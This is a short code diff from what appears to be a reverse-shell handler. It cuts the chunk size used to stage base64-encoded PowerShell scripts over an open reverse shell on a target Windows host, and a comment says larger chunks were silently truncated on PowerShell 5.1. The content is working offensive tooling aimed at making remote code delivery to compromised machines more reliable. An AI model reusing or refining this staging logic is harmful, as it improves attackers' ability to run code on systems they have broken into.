@@ -117,7 +117,10 @@ def _resolve_shell_kind(handler, client_sock, shell_kind=None) -> str:
 
 def _stage_encoded_script(handler, client_sock, encoded: str, stage_fn, stage_timeout=3.0) -> str:
     var = f"T{secrets.token_hex(4)}"
-    chunks = [encoded[i:i + 3500] for i in range(0, len(encoded), 3500)]
+    # Chunk size must stay well below the target PowerShell console's input
+    # line limit. 3500 caused silent truncation on PS 5.1 builds; 800 leaves
+    # a wide safety margin while keeping the number of round trips modest.
+    chunks = [encoded[i:i + 800] for i in range(0, len(encoded), 800)]
     handler._flush_shell(client_sock, timeout=0.3)
     for idx, chunk in enumerate(chunks):
         if not handler.send_to_revshell(client_sock, stage_fn(var, chunk, idx)):
@@ -152,7 +155,7 @@ def _run_ps_via_tempfile(handler, client_sock, script, stage_timeout=3.0) -> boo
     encoded = base64.b64encode(script.encode('utf-16-le')).decode('ascii')
     var = f"T{secrets.token_hex(4)}"
 
-    chunks = [encoded[i:i + 3500] for i in range(0, len(encoded), 3500)]
+    chunks = [encoded[i:i + 800] for i in range(0, len(encoded), 800)]
     handler._flush_shell(client_sock, timeout=0.3)
     for idx, chunk in enumerate(chunks):
         if not handler.send_to_revshell(client_sock, _stage_base64_cmd(var, chunk, idx)):
